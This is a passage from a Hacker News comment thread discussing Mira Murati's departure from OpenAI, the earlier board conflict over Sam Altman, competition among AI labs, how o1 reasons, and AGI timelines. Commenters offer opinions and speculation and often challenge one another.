perfect\"? In either case, have you tried giving the entire manual to the LLM context window? If the new system can be interacted with in a non-destructive manner at low cost and with useful responses, then existing AI can self-generate the training data. If it merely takes a year, businesses will rush to get that training data even if they need to pay humans for a bit: Cars are an example of \"real data is expensive or destructive\", it's clearly taking a lot more than a year to get there, and there's a lot of investment in just that. Pay 10,000 people USD 100,000 each for a year, that billion dollar investment then gets reduced to 2.4 million/year in ChatGPT Plus subscription fees or whatever. Plenty of investors will take that deal… if you can actually be sure it will work. reply killerstorm 7 hours agorootparentprev1. In-context learning is a thing. 2. You might need only several hundred of examples for fine-tuning. (OpenAI's minimum is 10 examples.) 3. I don't think research into fine-tuning efficiency have exhausted its possibilities. Fine-tuning is just not a very hot topic, given that general models work so well. In image generation where it matters they quickly got to a point where 1-2 examples are enough. So I won't be surprised if doc-to-model becomes a thing. reply stathibus 21 hours agorootparentprevat the very least you could say \"parsing and predicting text, images, and audio\". and you would be correct - physical embodiment and spatial reasoning are missing. reply Yizahi 10 hours agorootparentIt's all just text though, both images and audio are presented to LLM as a text, the training data is a text and all it does is append small bits of text to a larger text iteratively. So parent poster was correct. reply ben_w 21 hours agorootparentprevJust spatial resoning, people have already demonstrated it controlling robots. reply bamboozled 5 hours agoparentprevWill anyone be working for anyone if we had AGI? reply ilrwbwrkhv 22 hours agoparentprevOpen AI fired her. She didn't drop out. reply keeptrying 18 hours agorootparentDo you have any proof even circumstantial? reply _giorgio_ 10 hours agorootparenthttps://nypost.com/2024/03/08/business/openai-chief-technolo... reply enraged_camel 5 hours agorootparentThat's not evidence, though? reply _giorgio_ 10 hours agorootparentprevYes. All the conspirators are out now. https://nypost.com/2024/03/08/business/openai-chief-technolo... reply belter 4 hours agorootparenthttps://fortune.com/2024/09/25/sam-altman-psychedelic-experi... reply paxys 21 hours agoprevI will never understand why people still take statements like these at face value. These aren't her personal thoughts and feelings. The letter was carefully crafted by OpenAI's PR team under strict direction from Sam and the board. Whatever the real story is is sitting under many layers of NDAs and threats of clawing back/diluting her shares, and we will not know it for a long time. What I can say for certain is no executive in her position ever willingly resigns to pursue different passions/spend more time with their family/enjoy retirement or whatever else. reply h4ny 12 hours agoparentIt sounds like you probably are already aware, but perhaps most people don't take statements like those at face value but we have all been conditioned to \"shut up and move on\", by people who appear to be able to hold our careers hostage if we displease them. reply mayneack 18 hours agoparentprevI mostly agree that \"willingly resigns to pursue other passions\" is unlikely however \"quit in frustration over $working_conditions\" is completely plausible. Those could be anything from disagreeing with some strategy or thinking your boss is too much of a jerk to work with over your alternative options. reply davesque 21 hours agoparentprev> no executive in her position ever willingly resigns to pursue different passions/spend more time with their family/enjoy retirement or whatever else Especially when they enjoy a position like hers at the most important technology company in a generation. reply norir 17 hours agorootparentTime will tell about openai's true import. Right now, the jury is very much out. Even in the llm space, it is not clear that openai will be the ultimate victor. Especially if they keep hemorrhaging talent. reply salomonk_mur 16 hours agorootparentStill, certainly the most visible. reply cleandreams 15 hours agorootparentThey also get the most revenue and users. reply dougb5 17 hours agoparentprevThere may be a story, and I'm sure she worded the message carefully, but I don't see any reason to doubt she worded it herself. \"Create the time and space to do my own exploration\" is beautiful compared to the usual. To me means she is confident enough in her ability to do good in the world that the corporate identity she's now tethered to is insignificant by comparison. reply tasuki 21 hours agoparentprev> What I can say for certain is no executive in her position ever willingly resigns to pursue different passions/spend more time with their family/enjoy retirement or whatever else. Do you think that's because executives are so exceedingly ambitious, or because pursuing different passions is for some reason less attractive? reply mewpmewp2 20 hours agorootparentI would say that reaching this type of position requires exceeding amount of ambition, drive and craving in the first place, and all and any steps during the process of getting there solidify that by giving the dopamine hits to be addicted to such success, so it is not a case where you can just stop and decide \"I'll chill now\". reply theGnuMe 15 hours agorootparentDopamine hits... I wonder if this explains why the OpenAI folks tweet a lot... It's kind of weird right, to tweet a lot? But all these tweets from lower level execs as well. I mean I love Machine Learning twitter hot takes because it exposes me to interesting ideas (and maybe that is why people tweet) but it seems more about status seeking/marketing than anything else. And really as I learn more, you see that the literature is iterating/optimizing the current fashion. But maybe no weirder than commenting here I guess though.. maybe this is weird. Have we all collectively asked ourselves, why do we comment here? It's gotta be the dopamine. reply paulcole 20 hours agorootparentprevIt’s because they can’t imagine themselves doing it so they imagine that everyone must be like that. It’s part hubris and part lack of creativity/empathy. Think about if you’ve ever known someone you’ve been envious of for whatever reason who did something that just perplexed you. “They dumped their gorgeous partner, how could they do that?” “They quit a dream job, how could they do that?” “They moved out of that awesome apartment, how could they do that?” “They dropped out of that elite school, how could they do that?” Very easily actually. You’re seeing only part of the picture. Beautiful people are just as annoying as everybody else. Every dream job has a part that sucks. If you can’t imagine that, you’re not trying hard enough. You can see this in action in a lot of ways. One good one is the Ultimatum Game: https://www.core-econ.org/the-economy/microeconomics/04-stra... Most people will end up thinking that they have an ironclad logical strategy but if you ask them about it, it’ll end up that their strategy is treating the other player as a carbon copy of themselves. reply KeplerBoy 11 hours agoparentprevWouldn't such a statement rather be written by her own lawyers and trusted advisors? Either way, it's meaningless prose. reply baxtr 19 hours agoparentprevIt was probably crafted with ChatGPT? reply ants_everywhere 19 hours agoprev> we fundamentally changed how AI systems learn and reason through complex problems I'm not an AI researcher, have they done this? The commentary I've seen on o1 is basically that they incorporated techniques that were already being used. I'd also be curious to learn: what fundamental contributions to research has OpenAI made? The ChatGPT that was released in 2022 was based on Google's research, and IMO the internal Google chatbot from 2021 was better than the first ChatGPT. I know they employ a lot of AI scientists who have previously published milestone work, and I've read at least one OpenAI paper. But I'm genuinely unaware of what fundamental breakthroughs they've made as a company. I'm willing to believe they've done important work, and I'm seriously asking for pointers to some of it. What I know of them is mainly that they've been first to market with existing tech, possibly training on more data. reply trashtester 4 hours agoparentThe way I understand it, the key difference is that when training o1, they were going beyond simply \"think step-by-step\" in that they were feeding the \"step-by-step\" reasoning patterns that ended up with a correct answer back into the training set, meaning the model was not so much trained to find the correct answer directly, but rather to reason using patterns that would generally lead to a correct answer. Furthermore, o1 is able to ignore (or even leverage) previous reasoning steps that do NOT lead to the correct answer to narrow down the search space, and then try again at inference time until it finds an answer that it's confident is correct. This (probably combined with some secret sauce to make this process more efficient) allows it to optimize how it navigates the search space of logical problems, basically the same way AlphaZero navigated to search space of games like Go and Chess. This has the potential to teach it to reason in ways that go beyond just creating a perfect fit to the training set. If the reasoning process itself becomes good enough, it may become capable of solving reasoning problems that are beyond most or even all humans, and in a fraction of the time. It still seems that o1 still has a way to go when it comes to it's World Model. That part may require more work on video/text/sound/embodiement (real or virtual). But for abstract problems, o1 may indeed be a very significant breakthrough, taking it beyond what we typically think of as an LLM. reply ants_everywhere 3 minutes agorootparentGot it! Super cool and very helpful thanks! reply danpalmer 18 hours agoparentprevI think it's inarguable that OpenAI have at least at times over the last 3 years been well ahead of other companies. Whether that's true now is open to debate, but it has been true. This suggests they have either: made substantial breakthroughs, that are not open, or that the better abilities of OpenAI products are due to non-substantial tweaks (more training, better prompting, etc). I'm not sure either of these options is great for the original mission of OpenAI, although given their direction to \"Closed-AI\" I guess the former would be better for them. reply ants_everywhere 17 hours agorootparentI left pretty soon after a Google engineer decided the internal chat bot was sentient but before ChatGPT 3.5 came out. So I missed the entire period where Google was trying to catch up. But it seemed to me before I left that they were struggling to productize the bot and keep it from saying things that damage the brand. That's definitely something OpenAI figured out first. I got the feeling that maybe Microsoft's Tay experience cast a large shadow on Google's willingness to take its chat bot public. reply incognition 18 hours agoparentprevIlya was the Google researcher.. reply ants_everywhere 18 hours agorootparentWasn't he at OpenAI when transformers and Google's pretrained transformer BERT came out? reply Imnimo 23 hours agoprevIt is hard for me to square \"This company is a few short years away from building world-changing AGI\" and \"I'm stepping away to do my own thing\". Maybe I'm just bad at putting myself in someone else's shoes, but I feel like if I had spent years working towards a vision of AGI, and thought that success was finally just around the corner, it'd be very difficult to walk away. reply lacker 22 hours agoparentIt's easy to have missed this part of the story in all the chaos, but from the NYTimes in March: Ms. Murati wrote a private memo to Mr. Altman raising questions about his management and also shared her concerns with the board. That move helped to propel the board’s decision to force him out. https://www.nytimes.com/2024/03/07/technology/openai-executi... It should be no surprise if Sam Altman wants executives who opposed his leadership, like Mira and Ilya, out of the company. When you're firing a high-level executive in a polite way, it's common to let them announce their own departure and frame it the way they want. reply startupsfail 22 hours agorootparentGreg Brockman, OpenAI President and co-founder is also on extended leave of absence. And John Schulman, and Peter Deng are out already. Yet the company is still shipping, like no other. Recent multimodal integrations and benchmarks of o1 are outstanding. reply vasco 21 hours agorootparent> Yet the company is still shipping, like no other If executives / high level architects / researchers are working on this quarter's features something is very wrong. The higher you get the more ahead you need to be working, C-level departures should only have an impact about a year down the line, at a company of this size. reply mise_en_place 17 hours agorootparentFunny, at every corporation I've worked for, every department was still working on last quarter's features. FAANG included. reply dartos 16 hours agorootparentThat’s exactly what they were saying. The department are operating behind the executives. reply saalweachter 7 hours agorootparentprevC-level employees are about setting the company's culture. Clearing out and replacing the C-level employees ultimately results in a shift in company culture, a year or two down the line. reply ttcbj 21 hours agorootparentprevThis is a good point. I had not thought of it this way before. reply Aeolun 19 hours agorootparentprevYou may find that this is true in many companies. reply ac29 20 hours agorootparentprev> the company is still shipping, like no other Meta, Anthropic, Google, and others all are shipping state of the art models. I'm not trying to be dismissive of OpenAI's work, but they are absolutely not the only company shipping very large foundation models. reply g8oz 16 hours agorootparentIndeed Anthropic is just as good, if not better in my sample size of one. Which is great because OpenAI as an org gives shady vibes - maybe it's just Altman, but he is running the show. reply MavisBacon 9 hours agorootparentClaude is pretty brilliant. reply pama 19 hours agorootparentprevPerhaps you havent tried o1-preview or advanced voice if you call all the rest SOTA. reply Aeolun 19 hours agorootparentIf only they’d release the advanced voice thing as an API. Their TTS is already pretty good, but ai wouldn’t say no to an improvement. reply csomar 14 hours agorootparentprev> Yet the company is still shipping, like no other. I don't see it for OpenAI, I do see it for the competition. They have shipped incremental improvements, however, they are watering down their current models (my guess is they are trying to save on compute?). Copilot has turned into garbage and for coding related stuff, Claude is now better than gpt-4. Honestly, their outlook is bleak. reply benterix 11 hours agorootparentYeah, I have the same feeling. It seems like operating GPT-4 is too expensive, so they decided to call it \"legacy\" and get rid of it soon, and instead focus on cheaper/faster 4o, and also chain its prompts to call it a new model. I understand why they are doing it, but honestly if they cancel GPT-4, many people will just cancel their subscription. reply moondistance 16 hours agorootparentprevVP Research Barret Zoph and Chief Research Officer Bob McGrew also announced their departures this evening. reply RobertDeNiro 18 hours agorootparentprevGreg’s wife is pretty sick. For all we know this is unrelated to the drama. reply theGnuMe 16 hours agorootparentSorry to hear that, all the best wishes to them. reply imdsm 11 hours agorootparentContext (I think): https://x.com/gdb/status/1744446603962765669 Big fan of Greg, and I think the motivation behind AGI is sound here. Even what we have now is a fantastic tool, if people decide to use it. reply dartos 16 hours agorootparentprev> like no other Really? Anthropic seems to be popping off right now. Kagi isn’t exactly in the AI space, but they ship features pretty frequently. OpenAI is shipping incremental improvements to its chatgpt product. reply jjtheblunt 16 hours agorootparent\"popping off\" means what? reply dartos 13 hours agorootparentModern colloquialism generally meaning Moving/advancing/growing/gaining popularity very fast reply elbear 12 hours agorootparentAre they? In my recent experience, ChatGPT seems to have gotten better than Claude again. Plus their free limit is more strict, so this experience is on the free account. reply 0xKromo 12 hours agorootparentIts just tribalism. People tend to find a team to root for when there is a competition. Which one is better is subjective at this point imo. reply jpeg-irl 11 hours agorootparentprevThe features shipped by Anthropic in the past month are far more practical and provide clear value for builders than o1's chain of thought improvements. - Prompt Cache, 90% savings on large system prompts for 5 mins of calls. This is amazing - Contexual RAG, while not ground breaking idea, is important thinking and method for better vector retrieval reply vicentwu 16 hours agorootparentprevPast efforts leds to today's products. We need to wait to see the real imapct on the ability to ship. reply mistercheph 12 hours agorootparentprevIn my humble opinion you're wrong, Sora and 4o voice are months old and no signs they're not vaporware, and they still haven't shipped a text model on par with 3.5 sonnet! reply FactKnower69 21 hours agorootparentprevnext [9 more] [flagged] fjdjshsh 21 hours agorootparentIs that your test suite? reply 015a 19 hours agorootparentCompanies are held to the standard that their leadership communicates (which, by the way, is also a strong influencing factor in their valuation). People don't lob these complaints at Gemini, but the CEO of Google also isn't going on podcasts saying that he stares at an axe on the wall of his office all day musing about how the software he's building might end the world. So its a little understandable that OpenAI would be held to a slightly higher standard; its only commensurate with the valuation their leadership (singular, person) dictates. reply mckirk 20 hours agorootparentprevTo be fair, that question is one of the suggested questions that OpenAI shows themselves in the UI, for the o1-preview model. (Together with 'Is a hot dog a sandwich?', which I confess I will have to ask it now.) reply magxnta 20 hours agorootparentIf you have a sandwich and cut it in half, do you have one or two sandwiches? reply fuzztester 18 hours agorootparentMu. https://en.m.wikipedia.org/wiki/Mu_(negative) See Non-dualistic meaning section. reply Dylan16807 15 hours agorootparentprevAssuming a normal cut, this isn't a question about how you define a sandwich, this is a question about the number of servings, and only you can answer that. reply bee_rider 17 hours agorootparentprevYes, you do have one or two sandwiches. Edit: oh dang, I wanted to make the “or” joke so badly that I missed the option to have zero sandwiches. reply fragmede 19 hours agorootparentprevDepends on what kind of sandwich it was before, and along which axis you cut it, and where you fall on the sandwich alignment chart. reply fairity 21 hours agorootparentprevQuite interesting that this comment is downvoted when the content is factually correct and pertinent. It's a very relevant fact that Greg Brockman recently left on his own volition. Greg was aligned with Sam during the coup. So, the fact that Greg left lends more credence to the idea that Murati is leaving on her own volition. reply frakkingcylons 21 hours agorootparent> It's a very relevant fact that Greg Brockman recently left on his own volition. Except that isn’t true. He has not resigned from OpenAI. He’s on extended leave until the end of the year. That could become an official resignation later, and I agree that that seems more likely than not. But stating that he’s left for good as of right now is misleading. reply meiraleal 20 hours agorootparentprev> Quite interesting that this comment is downvoted when the content is factually correct and pertinent. >> Yet the company is still shipping, like no other. this is factually wrong. Just today Meta (which I despise) shipped more than openAI in a long time. reply SkyMarshal 21 hours agorootparentprev> When you're firing a high-level executive in a polite way, it's common to let them announce their own departure and frame it the way they want. You also give them some distance in time from the drama so the two appear unconnected under cursory inspection. reply SadTrombone 18 hours agorootparentprevTo be fair she was also one of the employees who signed the letter to the board demanding that Altman be reinstated or she would leave the company. reply hobofan 15 hours agorootparentDoes that actually mean anything? Didn't 95% of the company sign that letter, and soon afterwards many employees stated that they felt pressured by a vocal minority of peers and supervisors to sign the letter? E.g. if most executives on her level already signed the letter, it would have been political suicide not to sign it reply saagarjha 10 hours agorootparentShe was second-in-command of the company. Who else is there on her level to pressure her to sign such a thing, besides Sam himself? reply bradleyjg 18 hours agorootparentprevIsn’t that even worse? You write to the board, they take action on your complaints, and then you change your mind? reply barkingcat 17 hours agorootparentIt means when she was opting for the reinstating of Altman, she didn't have all the information needed to make a decsion Now that she's seen exactly what prompted the previous board to fire Altman, she fires herself because she understands their decision now. reply mempko 18 hours agorootparentprevExactly, Sam Altman wants group think, no opposition, no diversity of thought. That's what petty dictators demand. This spells the end of OpenAI IMO. Huge amount of money will keep it going until it doesn't reply aresant 22 hours agoparentprevI think the much more likely scenario than product roadmap concerns is that Murati (and Ilya for that matter) took their shot to remove Sam, lost, and in an effort to collectively retain billion$ of enterprise value have been playing nice, but were never seriously going to work together again after the failed coup. reply deepGem 22 hours agorootparentWhy is it so hard to just accept this and be transparent about motives ? It's fair to say 'we were not aligned with Sam, we tried an ouster, didn't pan out so the best thing for us to do is to leave and let Sam pursue his path\", which the entirely company has vouched for. Instead, you get to see grey area after grey area. reply jjulius 21 hours agorootparentBecause, for some weird reason, our culture has collectively decided that, even if most of us are capable of reading between the lines to understand what's really being said or is happening, it's often wrong and bad to be honest and transparent, and we should put the most positive spin possible on it. It's everywhere, especially in professional and political environments. reply discordance 19 hours agorootparentFor a counter example of what open and transparent communincation from a C-level tech person could look like, have a read of what the SpaCy founder blogged about a few months ago: https://honnibal.dev/blog/back-to-our-roots reply vincnetas 11 hours agorootparentStakes are orders of magnitude lower in spaCy case compared to OpenAI (for announcer and for people around them). It's easier to just be yourself when you're back on square one. reply bergen 10 hours agorootparentprevThis is not a culture thing imo, being honest and transparent makes you vulnerable to exploits, which is often a bad thing for the ones being honest and transparent in a high competition area. reply jjulius 51 minutes agorootparentBeing dishonest and cagey only serves to build public distrust in your organization, as has happened with OpenAI over the past couple of months. Just look at all of the comments throughout this thread for proof of that. Edit: Shoot, look at the general level of distrust that the populous puts in politicians. reply fsndz 9 hours agorootparentprevhypocrisy has to be the core of every corporate or political environment I have observed recently. I can count the occasions or situations where telling the simple truth is helpful. even the people who tell you to tell the truth are often the ones incapable of handling it. reply dragonelite 9 hours agorootparentFrom experience unless the person mention their next \"adventure\"(within like a couple of months) or gig it usually means a manager or c-suite person got axed and was given the option to gracefully exit. reply deepGem 2 hours agorootparentBy the barrage of exits following Mira's resignation, it does look like Sam fired her, the team got the wind of this and are now quitting in droves. This is the thing about lying and being polite. You can't hide the truth for long. Mira's latest one liner tweet 'OpenAI is nothing without it's people\" speaks volumes. reply fsndz 7 hours agorootparentprevtrue reply lotsofpulp 14 hours agorootparentprevIt is human nature to use plausible deniability to play politics and fool one’s self or others. You will get better results in negotiations if you allow the opposing party to maintain face (i.e. ego). See flirting as a more basic example. reply kyawzazaw 12 hours agorootparentprevnot for two sigma reply FactKnower69 21 hours agorootparentprevMcKinsey MBA brain rot seeping into all levels of culture reply cedws 20 hours agorootparentThat's giving too much credit to McKinsey. I'd argue it's systemic brainrot. Never admit mistakes, never express yourself, never be honest. Just make up as much bullshit as possible on the fly, say whatever you have to pacify people. Even just say bullshit 24/7. Not to dunk on Mira Murati, because this note is pretty cookie cutter, but it exemplifies this perfectly. It says nothing about her motivations for resigning. It bends over backwards to kiss the asses of the people she's leaving behind. It could ultimately be condensed into two words: \"I've resigned.\" reply Earw0rm 13 hours agorootparentIt's a management culture which is almost colonial in nature, and seeks to differentiate itself from a \"labor class\" which is already highly educated. Never spook the horses. Never show the team, or the public, what's going on behind the curtain.. or even that there is anything going on. At all time present the appearance of a swan gliding serenely across a lake. Because if you show humanity, those other humans might cotton on to the fact that you're not much different to them, and have done little to earn or justify your position of authority. And that wouldn't do at all. reply NoGravitas 4 hours agorootparentprev> Just make up as much bullshit as possible on the fly, say whatever you have to pacify people. Probably why AI sludge is so well suited to this particular cultural moment. reply ssnistfajen 13 hours agorootparentprevPeople, including East Asians, frequently claim \"face\" is an East Asian cultural concept despite the fact that it is omnipresent in all cultures. It doesn't matter if outsiders have figured out what's actually going on. The only thing that matters is saving face. reply startupsfail 22 hours agorootparentprev“the entire company has vouched for” is inconsistent with what we see now. Low/mid ranking employees were obviously tweeting in alignment with their management and by request. reply widowlark 22 hours agorootparentprevid imagine that level of honesty could still lead to billions lost in shareholder value - thus the grey area. Market obfuscation is a real thing. reply stagger87 22 hours agorootparentprevIt's in nobodies best interest to do this especially when there is so much money at play. reply rvnx 21 hours agorootparentA bit ironic for a non-profit reply dragonwriter 9 hours agorootparentEveryone involved works at and has investments in a for-profit firm. The fact that it has a structure that subordinates it to the board of a non-profit would be only tangential to the interests involved even if that was meaningful and not just rhe lingering vestige of the (arguably, deceptive) founding that the combined organization was working on getting rid of. reply mewpmewp2 20 hours agorootparentprevAs I understand they are going to be stop being non-profit soonish now? reply sumedh 8 hours agorootparentprev> Why is it so hard to just accept this and be transparent about motives You are asking the question, why are politicians not honest? reply blitzar 12 hours agorootparentprevWe lie about our successes why would we not lie about our failures? reply mewpmewp2 20 hours agorootparentprevBecause if you are a high level executive and you are transparent on those things, and if it backfires, it will backfire hard for your future opportunities, since all the companies will view you as a potential liability. So it is always safer and wiser option to not say anything in case of any risk of it backfiring. So you do the polite PR messaging every single time. There's nothing to be gained on the individual level of being transparent, only to be risked. reply deepGem 19 hours agorootparentI doubt someone with Mira or Ilya’s calibre have to worry about future opportunities. They can very well craft their own opportunities. Saying I was wrong should not be this complicated, or saying we failed. I do however agree that there is nothing to be gained and everything to be risked. So why do it. reply dh2022 18 hours agorootparentTheir (Ilya and Mira) perspective on anything is so far remote from your (and my) perspectives that trying to understand their personal feelings behind their resignation is an enterprise doomed to failure. reply bookofjoe 22 hours agorootparentprev\"When you strike at a king, you must kill him.\" — Emerson reply sllewe 21 hours agorootparentor an alternate - \"Come at the king - you best not miss\" -- Omar Little. reply timy2shoes 17 hours agorootparent“the King stay the King.” —- D’Angelo Barksdale reply sirspacey 14 hours agorootparent“Original King Julius is on the line.” - Sacha Baron Cohen reply selcuka 13 hours agorootparentKing Julien reply macintux 17 hours agorootparentprev“How do you shoot the devil in the back? What if you miss?” reply ionwake 21 hours agorootparentprevthe real OG comment here reply ropable 17 hours agorootparentprev\"When you play the game of thrones, you win or you die.\" - Cersei Lannister reply dangitman 22 hours agorootparentprev\"You come at the king, you best not miss.\" - Omar reply bg24 22 hours agorootparentprevThis is the likely scenario. Every conflict at exec level comes with a \"messaging\" aspect, with there being a comms team, and board to manage that part. reply amenhotep 22 hours agorootparentprevFailed coup? Altman managed to usurp the board's power, seems pretty successful to me reply xwowsersx 22 hours agorootparentI think OP means the failed coup in which they attempted to oust Altman? reply jordanb 22 hours agorootparentYeah the GP's point is the board was acting within its purview by dismissing the CEO. The coup was the successful counter-campaign against the board by Altman and the investors. reply jeremyjh 21 hours agorootparentThe successful coup was led by Satya Nadella. reply ethbr1 21 hours agorootparentprevLet's be honest: in large part by Microsoft. reply llamaimperative 18 hours agorootparentDoes it matter? The board made a decision and the CEO reversed it. There is no clearer example of a corporate coup. reply optimalsolver 22 hours agorootparentprevnext [2 more] [flagged] richbell 22 hours agorootparentFor fun: > In the sentence, the people responsible for the coup are implied to be Murati and Ilya. The phrase \"Murati (and Ilya for that matter) took their shot to remove Sam\" suggests that they were the ones who attempted to remove Sam (presumably a leader or person in power) but failed, leading to a situation where they had to cooperate temporarily despite tensions. reply Barrin92 22 hours agorootparentprev>but were never seriously going to work together again after the failed coup. Just to clear one thing up, the designated function of a board of directors is to appoint or replace the executive of an organisation, and openAI in particular is structured such that the non-profit part of the organisation controls the LLC. The coup was the executive, together with the investors, effectively turning that on its head by force. reply nopromisessir 22 hours agorootparentprevHighly speculative. Also highly cynical. Some folks are professional and mature. In the best organisations, the management team sets the highest possible standard, in terms of tone and culture. If done well, this tends to trickle down to all areas of the organization. Another speculation would be that she's resigning for complicated reasons which are personal. I've had to do the same in my past. The real pro's give the benefit of the doubt. reply itsoktocry 22 hours agorootparentWhat leads you to believe that OpenAI is one of the best managed organizations? reply nopromisessir 21 hours agorootparentMany hours of interviews. Organizational performance metrics. Frequency of scientific breakthroughs. Frequency and quality of product updates. History of consistently setting the state of the art in artificial intelligence. Demonstrated ability to attract world class talent. Released the fastest growing software product in the history of humanity. reply kranke155 21 hours agorootparentWe have to see if they’ll keep executing in a year, considering the losses in staff and the non technical CEO. reply nopromisessir 18 hours agorootparentI don't get this. I could write paragraphs... Why the rain clouds? reply dfgtyu65r 22 hours agorootparentprevThis feels naive, especially given what we now know about Open AI. reply nopromisessir 21 hours agorootparentIf you care to detail supporting evidence, I'd be keen to see. Please no speculative pieces, rumor nor hearsay. reply apwell23 21 hours agorootparentWell why was sam altman fired. it was never revealed. CEOs get fired all the time and company puts out a statement. I've never seen \"we won't tell you why we fired our CEO\" anywhere. now he is back making totally ridiculous statments like 'AI is going to solve all of physics' or that 'AI is going to clone my brain by 2027' This is a strange company. reply alephnerd 21 hours agorootparent> This is a strange company. Because the old guard wanted it to remain a cliquey non-profit filled to the brim with EA, AI Alignment, and OpenPhilanthropy types, but the current OpenAI is now an enterprise company. This is just Sam Altman cleaning house after the attempted corporate coup a year ago. reply llamaimperative 18 hours agorootparentWhen the board fires the CEO and the CEO reverses the decision, that is the coup. The board’s only reason to exist is effectively to fire the CEO. reply apwell23 18 hours agorootparentprevI think thats some rumors that they spread to make this look like a \"conflict of philosophy\" type bs. There are some juicy rumors about what actually happened too. much more belivable lol . reply sverhagen 22 hours agorootparentprevDid you also try to oust the CEO of a multi-billion dollar juggernaut? reply nopromisessir 21 hours agorootparentSure didn't. Neither did she though... To my knowledge. Can you provide any evidence that she tried to do that? I would ask that it be non-speculative in nature please. reply alephnerd 21 hours agorootparenthttps://www.nytimes.com/2023/11/17/technology/openai-sam-alt... reply nopromisessir 18 hours agorootparentBelow are exerts from the article you link. I'd suggest a more careful read through. Unless out of hand, you give zero credibility to first hand accounts given to the NYT by both Mirati and Sustkever... This piece is built on conjecture from a source whose identify is withheld. The sources version of events is openly refuted by the parties in question. Offering it as evidence that Mirati intentionally made political moves in order to get Altman ousted is an indefensible position. 'Mr. Sutskever’s lawyer, Alex Weingarten, said claims that he had approached the board were “categorically false.”' 'Marc H. Axelbaum, a lawyer for Ms. Murati, said in a statement: “The claims that she approached the board in an effort to get Mr. Altman fired last year or supported the board’s actions are flat wrong. She was perplexed at the board’s decision then, but is not surprised that some former board members are now attempting to shift the blame to her.” In a message to OpenAI employees after publication of this article, Ms. Murati said she and Mr. Altman “have a strong and productive partnership and I have not been shy about sharing feedback with him directly.” She added that she did not reach out to the board but “when individual board members reached out directly to me for feedback about Sam, I provided it — all feedback Sam already knew,” and that did not mean she was “responsible for or supported the old board’s actions.”' This part of NYT piece is supported by evidence: 'Ms. Murati wrote a private memo to Mr. Altman raising questions about his management and also shared her concerns with the board. That move helped to propel the board’s decision to force him out.' INTENT matters. Mirati says the board asked for her concerns about Altmans. She provided it and had already brought it to Altmans attention... in writing. Her actions demonstrate transparency and professionalism. reply jsheard 22 hours agoparentprev> It is hard for me to square \"This company is a few short years away from building world-changing AGI\" Altmans quote was that \"it's possible that we will have superintelligence in a few thousand days\", which sounds a lot more optimistic on the surface than it actually is. A few thousand days could be interpreted as 10 years or more, and by adding the \"possibly\" qualifier he didn't even really commit to that prediction. It's hype with no substance, but vaguely gesturing that something earth-shattering is coming does serve to convince investors to keep dumping endless $billions into his unprofitable company, without risking the reputational damage of missing a deadline since he never actually gave one. Just keep signing those 9 digit checks and we'll totally build AGI... eventually. Honest. reply ben_w 22 hours agorootparentBetween 1 and 10 thousands of days, so 3 to 27 years. A range I'd agree with; for me, \"pessimism\" is the shortest part of that range, but even then you have to be very confident the specific metaphorical horse you're betting on is going to be both victorious in its own right and not, because there's no suitable existing metaphor, secretly an ICBM wearing a patomime costume. reply dimitri-vs 18 hours agorootparentJust in time for them to figure out fusion to power all the GPUs. But really. o1 has been very whelming, nothing like the step up from 3.5 to 4. Still prefer sonnet3.5 and opus. reply zooq_ai 21 hours agorootparentprev1 you use 1 2 (or even 3) you use \"a couple\" A few is almost always > 3 and one could argue that upper limit 15 So, 10 years to 50 years reply usaar333 14 hours agorootparentfew is not > 3. Literally it's just >= 2, though I think >= 3 is the common definition. 15 is too high to be a \"few\" except in contexts of a few out of tens of thousands of items. Realistically I interpret this as 3-7 thousands of days (8 to 19 years), which is largely consensus prediction range anyway. reply rsynnott 9 hours agorootparentWhile it's not really _wrong_ to describe two things as 'a few', as such, it's unusual and people don't really do it in standard English. That said, I think people are possibly overanalysing this very vague barely-even-a-claim just a little. Realistically, when a tech company makes a vague claim about what'll happen in 10 years, that should be given precisely zero weight; based on historical precedent you might as well ask a magic 8-ball. reply ben_w 21 hours agorootparentprevPersonally speaking, above 10 thousand I'd switch to saying \"a few tens of thousands\". But the mere fact you say 15 is arguable does indeed broaden the range, just as me saying 1 broadens it in the opposite extent. reply fvv 20 hours agorootparentprevYou imply that he knows exactly when which imo is not and could even be next year for what we knows.. Who know every paper yet to be published?? reply 015a 19 hours agorootparentprevBecause as we all know: Full Self Driving is just six months away. reply squarefoot 19 hours agorootparentThanks, now I cannot unthink of this vision: developers activate the first ASI, and after 3 minutes it spits out full code and plans for a working Full Self Driving car prototype:) reply blitzar 12 hours agorootparentI thought super-intelligence was to say self driving would be fully operational next year for 10 consecutive years? reply squarefoot 3 hours agorootparentMy point was that only super intelligence could possibly solve a problem that we can only pretend to have solved. reply z7 22 hours agorootparentprev>Altmans quote was that AGI \"could be just a few thousand days away\" which sounds a lot more optimistic on the surface than it actually is. I think he was referring to ASI, not AGI. reply umeshunni 22 hours agorootparentIsn't ASI > AGI? reply ben_w 22 hours agorootparentBoth are poorly defined. By all the standards I had growing up, ChatGPT is already AGI. It's almost certainly not as economically transformative as it needs to be to meet OpenAI's stated definition. OTOH that may be due to limited availability rather than limited quality: if all the 20 USD/month for Plus gets spent on electricity to run the servers, at $0.10/kWh, that's about 274 W average consumption. Scaled up to the world population, that's approximately the entire global electricity supply. Which is kinda why there's also all the stories about AI data centres getting dedicated power plants. reply Spivak 21 hours agorootparentDon't know why you're being downvoted, these models meet the definition of AGI. It just looks different than perhaps we expected. We made a thing that exhibits the emergent property of intelligence. A level of intelligence that trades blows with humans. The fact that our brains do lots of other things to make us into self-contained autonomous beings is cool and maybe answers some questions about what being sentient means but memory and self-learning aren't the same thing as intelligence. I think it's cool that we got there before simulating an already existing brain and that intelligence can exist separate from consciousness. reply CaptainFever 22 hours agorootparentprevIs the S here referring to Sentient or Specialised? reply ben_w 22 hours agorootparentSuper(human). Old-school AI was already specialised. Nobody can agree what \"sentient\" is, and if sentience includes a capacity to feel emotions/qualia etc. then we'd only willingly choose that over non-sentient for brain uploading not \"mere\" assistants. reply jrflowers 20 hours agorootparentprevScottish. reply romanhn 22 hours agorootparentprevSuper, whatever that means reply saalweachter 6 hours agorootparentActually, the S means hope. reply bottlepalm 20 hours agorootparentprevGiven that ChatGPT is already smarter and faster than humans in many different metrics. Once the other metrics catch up with humans it will still be better than humans in the existing metrics. Therefore there will be no AGI, only ASI. reply threeseed 20 hours agorootparentMy fridge is already smarter and faster than humans in many different metrics. Has been this way since calculation machines were invented hundreds of years ago. reply rsynnott 9 hours agorootparent_Thousands_; an abacus can outperform any unaided human at certain tasks. reply vasco 21 hours agorootparentprevOpenAI is a Microsoft play to get into power generation business, specifically nuclear, which is a pet interest of Bill Gates for many years. There, that's my 